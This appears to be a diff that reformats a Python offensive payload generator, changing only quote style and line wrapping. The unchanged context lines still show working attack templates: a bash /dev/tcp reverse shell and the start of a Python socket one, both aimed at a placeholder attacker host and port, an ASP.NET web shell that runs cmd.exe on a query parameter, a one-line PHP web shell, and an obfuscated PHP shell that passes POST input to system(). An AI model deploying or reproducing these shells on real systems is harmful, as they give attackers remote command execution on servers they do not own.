@@ -52,7 +52,7 @@ class GeneratedPayload:
 
 SHELL_TEMPLATES: dict[str, dict[str, str]] = {
     "reverse_shell": {
-        "bash": 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1',
+        "bash": "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
         "python": (
             "import socket,subprocess,os\n"
             "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
@@ -124,22 +124,22 @@ SHELL_TEMPLATES: dict[str, dict[str, str]] = {
             '  string cmd = Request.QueryString["cmd"];\n'
             "  if (!string.IsNullOrEmpty(cmd)) {{\n"
             "    Process p = new Process();\n"
-            "    p.StartInfo.FileName = \"cmd.exe\";\n"
-            '    p.StartInfo.Arguments = "/c \" + cmd;\n'
+            '    p.StartInfo.FileName = "cmd.exe";\n'
+            '    p.StartInfo.Arguments = "/c " + cmd;\n'
             "    p.StartInfo.UseShellExecute = false;\n"
             "    p.StartInfo.RedirectStandardOutput = true;\n"
             "    p.Start();\n"
             "    Response.Write(p.StandardOutput.ReadToEnd());\n"
             "  }}\n"
             "}}\n"
-            '</script>'
+            "</script>"
         ),
         "php_simple": '<?=`$_GET["cmd"]`;?>',
         "php_obfuscated": (
             "<?php\n"
-            "$_ = \"Y29kZQ==\";\n"
-            "$__ = \"cmd\";\n"
-            "$___ = \"system\";\n"
+            '$_ = "Y29kZQ==";\n'
+            '$__ = "cmd";\n'
+            '$___ = "system";\n'
             "$____ = $_POST[$__];\n"
             "$___($____);\n"
             "?>"
@@ -198,7 +198,11 @@ class PayloadGenerator:
             template = SHELL_TEMPLATES.get(type_key, {}).get(fallback, "")
             language = PayloadLanguage(fallback)
 
-        code = template.replace("{LHOST}", lhost).replace("{LPORT}", str(lport)).replace("{RPORT}", str(rport))
+        code = (
+            template.replace("{LHOST}", lhost)
+            .replace("{LPORT}", str(lport))
+            .replace("{RPORT}", str(rport))
+        )
 
         desc_map = {
             PayloadType.REVERSE_SHELL: f"Reverse shell to {lhost}:{lport}",
